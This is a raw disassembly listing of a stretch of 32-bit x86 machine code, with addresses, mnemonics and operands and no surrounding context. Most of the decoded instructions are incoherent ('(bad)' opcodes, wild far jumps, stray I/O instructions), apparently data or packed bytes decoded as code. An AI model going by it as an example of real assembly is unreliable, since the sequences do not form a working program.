  40a9ac:	retf   
  40a9ad:	add    bh,bh
  40a9af:	inc    esi
  40a9b0:	inc    DWORD PTR [eax]
  40a9b2:	stc    
  40a9b3:	gs mov edi,0x368983
  40a9b9:	jmp    DWORD PTR [edi]
  40a9bb:	mov    bl,BYTE PTR [ebp-0x9007d]
  40a9c1:	push   DWORD PTR [ecx+0x83390e]
  40a9c7:	(bad)  
  40a9c9:	add    BYTE PTR [edi+0x7f],al
  40a9cc:	fwait
  40a9cd:	mov    esp,ecx
  40a9cf:	enter  0xff,0x6f
  40a9d3:	fld    DWORD PTR [ecx+0x0]
  40a9d6:	add    BYTE PTR [ebx],ch
  40a9d8:	(bad)  
  40a9d9:	inc    DWORD PTR [edx-0x7c005d90]
  40a9df:	push   es
  40a9e0:	(bad)  
  40a9e1:	jmp    FWORD PTR [esi]
  40a9e3:	dec    ebp
  40a9e4:	fdivp  st(7),st
  40a9e6:	add    BYTE PTR [ebx+0x0],al
  40a9e9:	mov    edi,ecx
  40a9eb:	in     eax,0x58
  40a9ed:	inc    DWORD PTR [eax]
  40a9ef:	add    DWORD PTR [eax],0x0
  40a9f2:	jno    0x40aa1d
  40a9f4:	rol    DWORD PTR [eax],cl
  40a9f6:	push   DWORD PTR [eax]
  40a9f8:	cmp    edi,0x3b
  40a9fb:	mul    ch
  40a9fd:	add    BYTE PTR [ebx+0x4a83ff13],al
  40aa03:	push   0x5cc83d7
  40aa08:	add    DWORD PTR [eax],0xffffff80
  40aa0b:	jg     0x40aa3b
  40aa0d:	or     esp,0xffffffb8
  40aa10:	add    DWORD PTR [eax],0x37
  40aa13:	imul   esi,DWORD PTR [ebx],0x0
  40aa16:	push   DWORD PTR [ebp-0x1]
  40aa19:	int3   
  40aa1a:	and    dh,cl
  40aa1c:	dec    eax
  40aa1d:	int3   
  40aa1e:	add    bl,cl
  40aa20:	add    bh,bh
  40aa22:	pop    es
  40aa23:	imul   ebp,eax,0xffffffff
  40aa26:	add    BYTE PTR [ecx+0x34f2ffff],ch
  40aa2c:	xor    DWORD PTR [eax],eax
  40aa2e:	sbb    DWORD PTR [ebp+0x1143ff83],0xffffffe8
  40aa35:	(bad)  
  40aa36:	jmp    FWORD PTR ds:0xf375ff00
  40aa3c:	leave  
  40aa3d:	(bad)  
  40aa3e:	inc    DWORD PTR [edx+0x0]
  40aa41:	add    BYTE PTR [ebp-0x5773],dl
  40aa47:	mov    ds:0xf7b889ff,al
  40aa4c:	nop
  40aa4d:	inc    DWORD PTR [eax]
  40aa4f:	stos   DWORD PTR es:[edi],eax
  40aa50:	add    ah,cl
  40aa52:	das    
  40aa53:	pop    ecx
  40aa54:	les    eax,FWORD PTR [eax]
  40aa56:	jmp    FWORD PTR [edi+0x4a3dffff]
  40aa5c:	test   DWORD PTR [eax],eax
  40aa5e:	mov    DWORD PTR [edi],edx
  40aa60:	add    bh,bh
  40aa62:	in     eax,dx
  40aa63:	add    BYTE PTR [ebp-0x34],dh
  40aa66:	add    BYTE PTR [esi],dh
  40aa68:	mov    edi,edi
  40aa6a:	(bad)  
  40aa6b:	stc    
  40aa6c:	mov    al,ds:0xccb8ffff
  40aa71:	call   FWORD PTR [esi]
  40aa73:	mov    al,0x4
  40aa75:	inc    DWORD PTR [eax]
  40aa77:	xor    ecx,esp
  40aa79:	add    BYTE PTR [ecx],ch
  40aa7b:	call   0xffff:0x408389a0
  40aa82:	add    edx,DWORD PTR [ebx+0xfccffe4]
  40aa88:	mov    DWORD PTR [ebx-0x567ffc],eax
  40aa8e:	mov    DWORD PTR [edi],edi
  40aa90:	inc    DWORD PTR [ebx-0x7cbb951a]
  40aa96:	int3   
  40aa97:	mov    bh,0xff
  40aa99:	jmp    DWORD PTR [ebp+0xff573e]
  40aa9f:	fcmovne st,st(4)
  40aaa1:	int3   
  40aaa2:	hlt    
  40aaa3:	jg     0x40aa4b
  40aaa5:	(bad)  
  40aaa6:	(bad)  
  40aaa7:	cmp    al,0x83
  40aaa9:	add    dh,dh
  40aaab:	mov    eax,ds:0xc5ffff5d
  40aab0:	add    bh,bh
  40aab2:	or     DWORD PTR [ebp-0x1c],0xffffffff
  40aab6:	add    BYTE PTR [edi-0x1],dl
  40aab9:	add    BYTE PTR [esi+0x303c],al
  40aabf:	push   ecx
  40aac0:	add    BYTE PTR [eax],al
  40aac2:	scas   al,BYTE PTR es:[edi]
  40aac3:	ins    BYTE PTR es:[edi],dx
  40aac4:	add    eax,0x4fff00
  40aac9:	call   DWORD PTR [ecx-0x56]
  40aacc:	enter  0x89ff,0xdc
  40aad0:	add    bh,bh
  40aad2:	xchg   ebx,eax
  40aad3:	aas    
  40aad4:	jl     0x40aad6
  40aad6:	add    dh,ch
  40aad8:	cmp    edi,0x21
  40aadb:	sbb    edx,esp
  40aadd:	inc    DWORD PTR [eax]
  40aadf:	(bad)  
  40aae0:	(bad)  
  40aae1:	call   FWORD PTR [esi+0xece1]
  40aae7:	inc    eax
  40aae8:	(bad)  
  40aae9:	jmp    esp
  40aaeb:	push   esi
  40aaec:	pop    edi
  40aaed:	(bad)  
  40aaee:	push   DWORD PTR [edi]
  40aaf0:	add    ah,cl
  40aaf2:	cmp    DWORD PTR [eax+edi*2-0x1],eax
  40aaf6:	add    DWORD PTR [ebx-0x7d],0xffffffff
  40aafa:	push   esp
  40aafb:	or     al,BYTE PTR [esi]
  40aafd:	cmp    edi,0x20
  40ab00:	add    bh,bh
  40ab02:	jbe    0x40aadf
  40ab04:	adc    edi,edi
  40ab06:	add    BYTE PTR [edi-0x7d],bh
  40ab09:	int3   
  40ab0a:	push   ebp
  40ab0b:	test   eax,0xc283cc42
  40ab10:	inc    DWORD PTR [eax]
  40ab12:	and    edx,DWORD PTR [edi-0x380000d3]
  40ab18:	add    bh,bh
  40ab1a:	add    al,0xbe
  40ab1c:	cmc    
  40ab1d:	inc    DWORD PTR [eax]
  40ab1f:	fwait
  40ab20:	inc    DWORD PTR [eax]
  40ab22:	mov    eax,0x83ffd4ce
  40ab27:	xchg   ebx,eax
  40ab28:	dec    esp
  40ab2a:	push   ebp
  40ab2b:	clc    
  40ab2c:	inc    BYTE PTR [ebx-0xf600]
  40ab32:	and    DWORD PTR [ebx],edi
  40ab34:	dec    esp
  40ab35:	cmp    edi,0x7c
  40ab38:	dec    esp
  40ab3a:	cmp    al,dl
  40ab3c:	or     bh,bh
  40ab3e:	jmp    DWORD PTR [ebx-0x1]
  40ab41:	jmp    FWORD PTR [ebx-0x56]
  40ab44:	pop    eax
  40ab45:	mov    DWORD PTR [ecx-0x28ff7cd2],ecx
  40ab4b:	dec    ebx
  40ab4c:	adc    al,0x83
  40ab4e:	call   FWORD PTR [edi-0x1]
  40ab51:	add    BYTE PTR ds:0x89ff84de,ch
  40ab57:	dec    edi
  40ab58:	dec    esp
  40ab5a:	mov    al,ds:0xccf28f
  40ab5f:	pop    ecx
  40ab60:	inc    DWORD PTR [eax]
  40ab62:	outs   dx,DWORD PTR ds:[esi]
  40ab63:	or     al,0x4e
  40ab65:	add    bh,bh
  40ab67:	mov    edx,0x2adeff83
  40ab6c:	ins    BYTE PTR es:[edi],dx
  40ab6d:	add    BYTE PTR [eax],al
  40ab6f:	add    ecx,DWORD PTR [ecx-0x11903b01]
  40ab75:	(bad)  
  40ab76:	(bad)  
  40ab77:	mov    edi,0x920fffff
  40ab7c:	xchg   ebx,eax
  40ab7d:	add    BYTE PTR [eax],al
  40ab7f:	das    
  40ab80:	(bad)  
  40ab81:	dec    DWORD PTR [ebp+0x68]
  40ab84:	scas   al,BYTE PTR es:[edi]
  40ab85:	dec    esp
  40ab87:	adc    edi,edi
  40ab89:	(bad)  
  40ab8a:	cmp    eax,0x83ff0af2
  40ab8f:	inc    eax
  40ab90:	mov    DWORD PTR [eax],eax
  40ab92:	dec    ebx
  40ab93:	mov    ebp,0x23ff0089
  40ab98:	cmp    edi,0xffffffa0
  40ab9b:	inc    esi
  40ab9c:	jge    0x40ab9d
  40ab9e:	call   FWORD PTR [esi-0x2de3ff77]
  40aba4:	jae    0x40aba5
  40aba6:	jmp    edx
  40aba8:	(bad)  
  40aba9:	inc    edx
  40abab:	leave  
  40abac:	pop    edx
  40abad:	inc    DWORD PTR [eax]
  40abaf:	call   0xe71dacb3
  40abb4:	add    edi,edi
  40abb6:	add    al,bl
  40abb8:	add    BYTE PTR [eax],al
  40abba:	test   DWORD PTR [eax+0x77],ebp
  40abbd:	(bad)  
  40abbe:	dec    eax
  40abc0:	(bad)  
  40abc1:	(bad)  
  40abc2:	fidiv  WORD PTR [ebp+ecx*4+0x0]
  40abc6:	dec    edx
  40abc8:	add    BYTE PTR [ebx-0x33f8f23f],al
  40abce:	mov    DWORD PTR [edi+edi*8-0x1],eax
  40abd2:	fs cdq 
  40abd4:	call   0xde83:0xa8ff00
  40abdb:	mov    ecx,0xf5ffff30
  40abe0:	add    DWORD PTR [ebx+0x37880d],0xffffffff
  40abe7:	sub    al,0xff
  40abe9:	push   DWORD PTR [edi+0x3f]
  40abec:	dec    esp
  40abed:	add    bh,bh
  40abef:	call   0x1698abf4
  40abf4:	test   al,0xff
  40abf6:	(bad)  
  40abf7:	mov    eax,0xc0e500cc
  40abfc:	out    0xcc,al
  40abfe:	mov    DWORD PTR [eax-0x2bca7700],ecx
  40ac04:	mov    DWORD PTR [eax],0xff83e6ff
  40ac0a:	out    0xe,al
  40ac0c:	add    al,0x0
  40ac0e:	call   FWORD PTR [edi+0x3b8283ff]
  40ac14:	add    DWORD PTR ss:[eax],0x7f
  40ac18:	add    BYTE PTR [ecx+0xaa461c],cl
  40ac1e:	inc    DWORD PTR [edi+edi*8]
  40ac21:	jmp    DWORD PTR [eax]
  40ac23:	xchg   edx,eax
  40ac24:	ss int3 
  40ac26:	int3   
  40ac27:	jp     0x40abb2
  40ac29:	mov    ecx,eax
  40ac2b:	ss and al,0xff
  40ac2e:	int3   
  40ac2f:	push   0xeeb8ffff
  40ac34:	xor    ah,cl
  40ac36:	call   FWORD PTR [ebp+0x0]
  40ac39:	mov    DWORD PTR [edi-0x7c769dfd],edi
  40ac3f:	pop    DWORD PTR [eax]
  40ac41:	add    BYTE PTR [eax+0x50],dl
  40ac44:	fs (bad) 
  40ac46:	jmp    FWORD PTR [eax]
  40ac48:	add    BYTE PTR [eax],al
  40ac4a:	push   es
  40ac4b:	fcomp  QWORD PTR [eax-0x34]
  40ac4e:	dec    ebx
  40ac50:	add    BYTE PTR [eax],al
  40ac52:	adc    edi,DWORD PTR [edx]
  40ac54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac55:	add    BYTE PTR [ecx+0x4dccff68],cl
  40ac5b:	in     al,dx
  40ac5c:	in     eax,dx
  40ac5d:	add    bh,bh
  40ac5f:	iret   
  40ac60:	mov    DWORD PTR [ecx+0xde1c22],ecx
  40ac66:	(bad)  
  40ac67:	ds (bad) 
  40ac69:	dec    esi
  40ac6b:	push   esi
  40ac6c:	ins    DWORD PTR es:[edi],dx
  40ac6d:	dec    esp
  40ac6f:	test   edi,edi
  40ac71:	add    ah,dl
  40ac73:	ss (bad) 
  40ac77:	mov    bh,bh
  40ac79:	add    al,cl
  40ac7b:	jle    0x40acf2
  40ac7d:	dec    DWORD PTR [ecx-0x33ffff8b]
  40ac83:	cs pop es
  40ac85:	dec    DWORD PTR [ecx-0x5876001b]
  40ac8b:	aaa    
  40ac8c:	inc    eax
  40ac8d:	add    bh,bh
  40ac8f:	push   esi
  40ac90:	cmp    edi,0x76
  40ac93:	jae    0x40ac22
  40ac95:	inc    DWORD PTR [ebx+0x7900fff8]
  40ac9b:	adc    BYTE PTR [esi-0x1],ah
  40ac9e:	int3   
  40ac9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aca0:	(bad)  
  40aca1:	push   DWORD PTR [edx-0x8a4e]
  40aca7:	sub    al,BYTE PTR [eax]
  40aca9:	inc    edx
  40acab:	inc    ebp
  40acac:	outs   dx,DWORD PTR ds:[esi]
  40acad:	mov    edi,edi
  40acaf:	mov    edi,0x9b47ffcc
  40acb4:	lahf   
  40acb5:	mov    esp,ecx
  40acb7:	jl     0x40ac85
  40acb9:	add    BYTE PTR [ecx],ah
  40acbb:	jnp    0x40ad29
  40acbd:	(bad)  
  40acbe:	call   DWORD PTR [edi-0x4a3f3301]
  40acc4:	repnz inc DWORD PTR [eax]
  40acc7:	loop   0x40ac52
  40acc9:	dec    edx
  40accb:	xchg   DWORD PTR [edx-0x327700],esi
  40acd1:	call   DWORD PTR [ebx+edx*8]
  40acd4:	call   0xe583:0xebffff
  40acdb:	sbb    bh,BYTE PTR [esi+0x190083]
  40ace1:	inc    DWORD PTR [edi+0x79]
  40ace4:	fdivr  st,st(7)
  40ace6:	(bad)  
  40ace7:	aas    
  40ace8:	add    BYTE PTR [eax],al
  40acea:	rcr    DWORD PTR [esi+0x32],1
  40aced:	cmp    edi,0xffffffdc
  40acf0:	add    DWORD PTR [eax],0xfffffffc
  40acf3:	ja     0x40ac97
  40acf5:	inc    DWORD PTR [eax]
  40acf7:	and    al,0xcc
  40acf9:	add    dl,dl
  40acfb:	pop    esp
  40acfc:	(bad)  
  40acfd:	(bad)  
  40acfe:	call   FWORD PTR [esi]
  40ad00:	add    bh,bh
  40ad02:	lds    edx,FWORD PTR [ebp-0x73]
  40ad05:	(bad)  
  40ad06:	dec    DWORD PTR [edi-0x1ffc7c34]
  40ad0c:	xchg   DWORD PTR [eax],eax
  40ad0e:	add    BYTE PTR [ebx+0x6b],al
  40ad11:	jmp    0xffff:0xcccff7f
  40ad18:	pop    ecx
  40ad19:	loopne 0x40acf4
  40ad1b:	(bad)  
  40ad1c:	dec    DWORD PTR [edi+0x1e89ffff]
  40ad22:	and    BYTE PTR [ebx-0x9c7d],al
  40ad28:	daa    
  40ad29:	in     al,0xf7
  40ad2b:	(bad)  
  40ad2c:	call   FWORD PTR [ecx-0x34]
  40ad2f:	cmp    DWORD PTR [edx-0x33762d7c],0x47
  40ad36:	cmp    edi,0xffffffd2
  40ad39:	retf   0x67
  40ad3c:	jmp    FWORD PTR [eax+eax*1-0x1]
  40ad40:	nop
  40ad41:	in     al,dx
  40ad42:	xor    al,BYTE PTR [ebx-0xaa01]
  40ad48:	or     esi,DWORD PTR [edx-0xb]
  40ad4b:	add    bh,bh
  40ad4d:	lahf   
  40ad4e:	int3   
  40ad4f:	add    BYTE PTR [edi-0x40f7],bl
  40ad55:	cmp    edi,0xe2cc7583
  40ad5b:	add    bh,bh
  40ad5d:	cmp    DWORD PTR [eax],eax
  40ad5f:	add    BYTE PTR [edi-0x7633205d],bl
  40ad65:	jl     0x40ad66
  40ad67:	mov    DWORD PTR [ebx],eax
  40ad69:	add    cl,BYTE PTR [esi+0x0]
  40ad6c:	(bad)  
  40ad6d:	stc    
  40ad6e:	(bad)  
  40ad6f:	(bad)  
  40ad70:	mov    esp,0x89ff0879
  40ad75:	mov    al,BYTE PTR [eax]
  40ad77:	cmp    DWORD PTR [esp+ebp*1-0x20000056],0xffffffcc
  40ad7f:	add    cl,ah
  40ad81:	daa    
  40ad82:	fild   WORD PTR [eax]
  40ad84:	jmp    FWORD PTR [esi]
  40ad86:	cmp    edi,0x76
  40ad89:	xchg   esp,eax
  40ad8a:	mov    dl,0x89
  40ad8c:	call   DWORD PTR [esi]
  40ad8e:	or     esp,0x5a
  40ad91:	add    eax,0x3483ffb2
  40ad96:	int3   
  40ad97:	adc    DWORD PTR [ecx+eax*1],0xfffffff3
  40ad9b:	(bad)  
  40ad9c:	call   DWORD PTR [ebx]
  40ad9e:	add    bh,bh
  40ada0:	das    
  40ada1:	mov    ecx,0x26ff8338
  40ada6:	add    ah,cl
  40ada8:	jb     0x40adf9
  40adaa:	jecxz  0x40adac
  40adac:	(bad)  
  40adad:	(bad)  
  40adaf:	add    BYTE PTR [edx+0x1b],al
  40adb2:	leave  
  40adb3:	inc    DWORD PTR [eax]
  40adb5:	pushf  
  40adb6:	add    bh,bh
  40adb8:	dec    esi
  40adb9:	inc    esp
  40adba:	hlt    
  40adbb:	add    BYTE PTR [ecx+0x6700ff58],cl
  40adc1:	dec    esp
  40adc2:	xor    bh,bh
  40adc4:	cmp    DWORD PTR [edx+0x0],0xffffffff
  40adc8:	jns    0x40ae22
  40adca:	cwde   
  40adcb:	mov    edi,edi
  40adcd:	push   ecx
  40adce:	add    bh,bh
  40add0:	pop    ebp
  40add1:	pop    esi
  40add2:	mov    al,ds:0xff48ff00
  40add7:	jmp    ecx
  40add9:	rcl    BYTE PTR [edi],0x0
  40addc:	int3   
  40addd:	stos   BYTE PTR es:[edi],al
  40adde:	add    ah,cl
  40ade0:	je     0x40ada3
  40ade2:	repz inc DWORD PTR [ebx+0x250000e0]
  40ade9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adea:	mov    edi,?
  40adec:	mov    DWORD PTR [ecx+0x0],edx
  40adef:	mov    edx,ecx
  40adf1:	(bad)  
  40adf2:	add    eax,DWORD PTR [ebx-0x6d00]
  40adf8:	and    BYTE PTR [edx-0x13ff33fb],dl
  40adfe:	(bad)  
  40adff:	push   edi
  40ae01:	cwde   
  40ae02:	jmp    0x5fae06
  40ae07:	add    BYTE PTR ds:0xfffffa9f,bl
  40ae0d:	add    eax,0xd8abffff
  40ae12:	hlt    
  40ae13:	add    bh,bh
  40ae15:	mov    ds:0xe16d89ff,eax
  40ae1a:	add    DWORD PTR [ebx-0x5301],0xffac990d
  40ae24:	inc    DWORD PTR ds:0x4a8e8300
  40ae2a:	idiv   bh
  40ae2c:	add    BYTE PTR [ecx-0x3d020001],cl
  40ae32:	aam    0x0
  40ae34:	jmp    eax
  40ae36:	or     DWORD PTR [ecx+0xd47d8b],0xffffffff
  40ae3d:	(bad)  
  40ae3f:	add    BYTE PTR [esi-0x330090ca],dl
  40ae45:	fild   WORD PTR [eax]
  40ae47:	add    al,al
  40ae49:	inc    edi
  40ae4a:	dec    ecx
  40ae4b:	cmp    edi,0xffffffb7
  40ae4e:	inc    DWORD PTR [eax]
  40ae50:	jp     0x40aebc
  40ae52:	xor    edi,edi
  40ae54:	inc    edi
  40ae56:	or     esp,0xffffffe7
  40ae59:	jl     0x40aea3
  40ae5b:	add    bh,bh
  40ae5d:	or     al,0xff
  40ae5f:	add    dl,al
  40ae61:	ss aam 0xcc
  40ae64:	add    BYTE PTR [eax+eax*1+0x599ce200],ch
  40ae6b:	(bad)  
  40ae6c:	call   DWORD PTR [eax]
  40ae6e:	add    BYTE PTR [eax],al
  40ae70:	mov    edi,0x83ffe8fa
  40ae75:	mov    ch,0x83
  40ae77:	add    BYTE PTR [esi+eiz*8-0x41],ch
  40ae7b:	cmp    edi,0x7
  40ae7e:	(bad)  
  40ae7f:	(bad)  
  40ae80:	(bad)  
  40ae81:	xlat   BYTE PTR ds:[ebx]
  40ae82:	rol    DWORD PTR [eax],1
  40ae84:	adc    DWORD PTR [esi+0x239900ff],0x15
  40ae8b:	add    BYTE PTR [ecx-0x7c00ff10],cl
  40ae91:	mov    ecx,fs
  40ae93:	inc    DWORD PTR [ebx+0x4a83ff9b]
  40ae99:	ds pop ds
  40ae9b:	int3   
  40ae9c:	call   FWORD PTR [ebx+eax*4]
  40ae9f:	add    DWORD PTR [ecx-0xa40c],0xffffffa9
  40aea6:	inc    DWORD PTR [eax]
  40aea8:	add    al,0xa1
  40aeaa:	or     cl,ah
  40aeac:	call   FWORD PTR [ecx+0x7daa83ff]
  40aeb2:	jge    0x40aeb4
  40aeb4:	sbb    DWORD PTR [edi-0x1],0xffffffcc
  40aeb8:	out    dx,al
  40aeb9:	inc    esp
  40aeba:	iret   
  40aebb:	add    bh,bh
  40aebd:	dec    esi
  40aebe:	mov    DWORD PTR [eax],eax
  40aec0:	in     eax,0x7e
  40aec2:	inc    eax
  40aec3:	(bad)  
  40aec4:	inc    DWORD PTR [eax+eax*1-0x1]
  40aec8:	mov    esp,0xff007b1f
  40aecd:	mov    WORD PTR [eax],es
  40aecf:	(bad)  
  40aed0:	cld    
  40aed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aed2:	mov    ecx,0x7d00ff
  40aed7:	and    DWORD PTR [edi+eiz*1],0x7
  40aedb:	inc    DWORD PTR [eax]
  40aedd:	push   ss
  40aede:	int3   
  40aedf:	jmp    ebx
  40aee1:	or     BYTE PTR [esp+ecx*8+0x83b5ff],dh
  40aee8:	out    0x31,al
  40aeea:	outs   dx,DWORD PTR ds:[esi]
  40aeeb:	(bad)  
  40aeec:	push   DWORD PTR [esi-0x6cb07c01]
  40aef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef3:	mov    DWORD PTR [eax],eax
  40aef5:	cdq    
  40aef6:	inc    DWORD PTR [eax]
  40aef8:	pop    ss
  40aef9:	ret    
  40aefa:	rol    BYTE PTR [eax],cl
  40aefc:	(bad)  
  40aefd:	aas    
  40aefe:	add    bh,bh
  40af00:	mov    cl,0xee
  40af02:	sub    edi,edi
  40af04:	add    BYTE PTR [edi],dh
  40af06:	add    BYTE PTR [eax],al
  40af08:	and    eax,0xffaeac
  40af0d:	(bad)  
  40af0f:	jmp    DWORD PTR [esi+0x6b]
  40af12:	test   bh,bh
  40af14:	jmp    DWORD PTR [edx-0x7f9c7601]
  40af1a:	imul   eax,DWORD PTR [eax],0xccff4ecc
  40af20:	xchg   ebx,eax
  40af21:	call   0xff00:0x5aff8347
  40af28:	(bad)  
  40af29:	daa    
  40af2a:	lock cmp edi,0x32
  40af2e:	(bad)  
  40af2f:	push   esi
  40af31:	jne    0x40af44
  40af33:	mov    edi,edi
  40af35:	jp     0x40af37
  40af37:	add    BYTE PTR [ecx+0x87da],dl
  40af3d:	adc    DWORD PTR [eax],eax
  40af3f:	jmp    FWORD PTR [edi-0xfffb32]
  40af45:	sar    bh,1
  40af47:	call   FWORD PTR [ecx]
  40af49:	retf   
  40af4a:	push   edi
  40af4b:	(bad)  
  40af4c:	(bad)  
  40af4d:	cld    
  40af4e:	add    bh,bh
  40af50:	push   0xff899494
  40af55:	jnp    0x40af56
  40af57:	add    BYTE PTR [edx+edi*4],al
  40af5a:	mov    WORD PTR [eax],es
  40af5c:	push   DWORD PTR [ebp-0x7d]
  40af5f:	call   DWORD PTR [esi+0x89e9a9]
  40af65:	add    edi,edi
  40af67:	mov    DWORD PTR [ebp-0x7c0068bf],eax
  40af6d:	arpl   di,di
  40af6f:	add    BYTE PTR [esi-0x36],dh
  40af72:	mov    bl,0xff
  40af74:	dec    DWORD PTR [ebx]
  40af76:	add    bh,bh
  40af78:	mov    ebp,0xff0096ff
  40af7d:	(bad)  
  40af7e:	dec    esp
  40af80:	inc    esp
  40af82:	lahf   
  40af83:	inc    DWORD PTR [ebx-0x21760030]
  40af89:	enter  0xf3,0xcc
  40af8d:	sbb    al,0xff
  40af8f:	adc    esi,0xffffff9b
  40af92:	adc    al,BYTE PTR [eax]
  40af94:	add    al,cl
  40af96:	inc    DWORD PTR [ebx-0x7cfd1149]
  40af9c:	jmp    FWORD PTR [edi-0x1]
  40af9f:	add    BYTE PTR [ebx],dl
  40afa1:	bound  edx,QWORD PTR [ebx]
  40afa3:	add    bh,bh
  40afa5:	scas   al,BYTE PTR es:[edi]
  40afa6:	mov    edi,edi
  40afa8:	xchg   edx,eax
  40afa9:	cmp    bh,dl
  40afab:	add    DWORD PTR [eax],0x12
  40afae:	add    bh,bh
  40afb0:	adc    BYTE PTR [eax+0x14],bh
  40afb3:	or     DWORD PTR [ecx-0x17c7c8d],0xffffffb5
  40afba:	cmp    eax,DWORD PTR [eax]
  40afbc:	push   DWORD PTR [esi-0x1]
  40afbf:	add    BYTE PTR [ebx],al
  40afc1:	or     al,0xd2
  40afc3:	mov    edi,edi
  40afc5:	xchg   edx,eax
  40afc6:	int3   
  40afc7:	push   DWORD PTR [edi-0x3f]
  40afca:	fcos   
  40afcc:	add    BYTE PTR [edx],bl
  40afce:	(bad)  
  40afcf:	jmp    esp
  40afd1:	scas   eax,DWORD PTR es:[edi]
  40afd2:	jg     0x40afd3
  40afd4:	add    BYTE PTR [ebp-0x733d0001],bl
  40afda:	xchg   ebx,eax
  40afdb:	add    bh,bh
  40afdd:	xchg   ebp,eax
  40afde:	cmp    edi,0x6e
  40afe1:	lods   eax,DWORD PTR ds:[esi]
  40afe2:	xchg   edx,eax
  40afe3:	(bad)  
  40afe4:	(bad)  
  40afe5:	cmp    eax,0x1d0fcccc
  40afea:	add    DWORD PTR [eax],eax
  40afec:	dec    DWORD PTR [ebp-0x17b4ff01]
  40aff2:	mov    DWORD PTR es:[eax],eax
  40aff5:	add    bh,bh
  40aff7:	inc    DWORD PTR [edx+0x14]
  40affa:	stc    
  40affb:	(bad)  
  40affc:	inc    edi
  40affe:	(bad)  
  40afff:	inc    DWORD PTR [edx+0x8608]
  40b005:	fs add bh,bh
  40b008:	paddusb mm1,QWORD PTR [edi-0x7cd40100]
  40b00f:	add    ch,al
  40b011:	jne    0x40aff4
  40b013:	inc    DWORD PTR [eax]
  40b015:	adc    eax,0x4d5e00cc
  40b01a:	mov    esi,0x7d8300
  40b01f:	add    BYTE PTR [esi],bl
  40b021:	xchg   edi,eax
  40b022:	imul   eax,DWORD PTR [ebx+0xffa1ff],0xff71878e
  40b02c:	dec    eax
  40b02e:	cmp    edi,0x9
  40b031:	fdivr  st(0),st
  40b033:	mov    DWORD PTR [eax],eax
  40b035:	call   0xffc1:0x7762ffff
  40b03c:	add    al,bh
  40b03e:	add    BYTE PTR [eax],al
  40b040:	mov    ds:0x832fb9,eax
  40b045:	stos   DWORD PTR es:[edi],eax
  40b046:	(bad)  
  40b047:	(bad)  
  40b048:	jp     0x40b0a1
  40b04a:	inc    esp
  40b04b:	int3   
  40b04c:	add    cl,dh
  40b04e:	add    BYTE PTR [eax],al
  40b050:	frstor [esi-0x2c]
  40b053:	add    DWORD PTR [eax],0xffffffd2
  40b056:	(bad)  
  40b057:	(bad)  
  40b058:	in     eax,dx
  40b059:	ja     0x40b06f
  40b05b:	(bad)  
  40b05c:	call   FWORD PTR [ecx-0x5be63301]
  40b062:	into   
  40b063:	mov    edi,edi
  40b065:	mov    ebx,0x56698300
  40b06a:	dec    edi
  40b06b:	inc    DWORD PTR [eax]
  40b06d:	push   0xffffffff
  40b06f:	add    BYTE PTR [edx-0xe5e2],dl
  40b075:	mov    ebp,0x6b95ff00
  40b07a:	pop    ecx
  40b07b:	add    DWORD PTR [ebx-0x3bffffcc],0xfffffff2
  40b082:	cmp    al,BYTE PTR [ebx+0xccceff]
  40b088:	aas    
  40b089:	fild   QWORD PTR [eax-0x1]
  40b08c:	jmp    FWORD PTR [ebx+0x3a790083]
  40b092:	jo     0x40b093
  40b094:	add    BYTE PTR [edx+0xf3200ff],ch
  40b09a:	push   ebp
  40b09b:	(bad)  
  40b09c:	dec    DWORD PTR [edi]
  40b09e:	inc    DWORD PTR [eax]
  40b0a0:	dec    ecx
  40b0a1:	fisubr WORD PTR [ecx-0x1]
  40b0a4:	and    DWORD PTR [edi],0xffffff83
  40b0a7:	call   edx
  40b0a9:	push   ecx
  40b0aa:	mov    ebp,0xff79ff83
  40b0af:	call   DWORD PTR [eax]
  40b0b1:	aas    
  40b0b2:	fadd   DWORD PTR [ebx-0x7b34]
  40b0b8:	outs   dx,DWORD PTR ds:[esi]
  40b0b9:	xor    al,0x34
  40b0bb:	add    bh,bh
  40b0bd:	jae    0x40b0bf
  40b0bf:	add    ecx,0x6e
  40b0c2:	stc    
  40b0c3:	inc    DWORD PTR [ebx+0x4083cce1]
  40b0c9:	mov    bl,0x0
  40b0cb:	add    BYTE PTR [ecx-0x1fff7ca5],cl
  40b0d1:	mov    edi,0xddffffcb
  40b0d6:	inc    DWORD PTR [eax]
  40b0d8:	jne    0x40b0da
  40b0da:	call   0x83483ade
  40b0df:	add    BYTE PTR [edx-0x5a],ch
  40b0e2:	mov    dl,0x89
  40b0e4:	(bad)  
  40b0e5:	mov    edi,0x71b5ffcc
  40b0ea:	repz (bad) 
  40b0ec:	call   FWORD PTR [ebx+0x0]
  40b0ef:	add    BYTE PTR [esi-0x19],al
  40b0f2:	dec    esp
  40b0f3:	add    BYTE PTR [eax],al
  40b0f5:	imul   eax,DWORD PTR [ebx+0x37597bff],0xff1dffff
  40b0ff:	call   esp
  40b101:	pop    edx
  40b102:	pop    edi
  40b103:	mov    edi,edi
  40b105:	rol    DWORD PTR [eax],0x0
  40b108:	dec    edx
  40b109:	inc    esi
  40b10a:	add    DWORD PTR [ebx+0xf089],0x833f0414
  40b114:	push   DWORD PTR [edx+0x0]
  40b117:	add    BYTE PTR [ebx],ah
  40b119:	adc    BYTE PTR [eax-0x7d],bh
  40b11c:	add    cl,bh
  40b11e:	(bad)  
  40b11f:	jmp    esp
  40b121:	mov    dl,0xf1
  40b123:	dec    esp
  40b125:	jo     0x40b127
  40b127:	and    DWORD PTR [ebx+ebx*2],0xffffffba
  40b12b:	(bad)  
  40b12c:	(bad)  
  40b12d:	in     al,dx
  40b12e:	mov    edi,edi
  40b130:	test   eax,0xffff6440
  40b135:	xchg   esp,ecx
  40b137:	add    BYTE PTR [esi+esi*4-0x55],bh
  40b13b:	add    bh,bh
  40b13d:	sbb    edi,edi
  40b13f:	add    BYTE PTR [edi-0x3f],dl
  40b142:	aad    0xff
  40b144:	(bad)  
  40b145:	fld    QWORD PTR [eax]
  40b147:	push   edx
  40b149:	out    dx,eax
  40b14a:	fmul   st,st(4)
  40b14c:	or     DWORD PTR [ebx],0x0
  40b14f:	jmp    edx
  40b151:	ss sahf 
  40b153:	mov    edi,edi
  40b155:	dec    ebx
  40b156:	inc    DWORD PTR [ebx-0xae95e3]
  40b15c:	inc    eax
  40b15e:	add    bh,bh
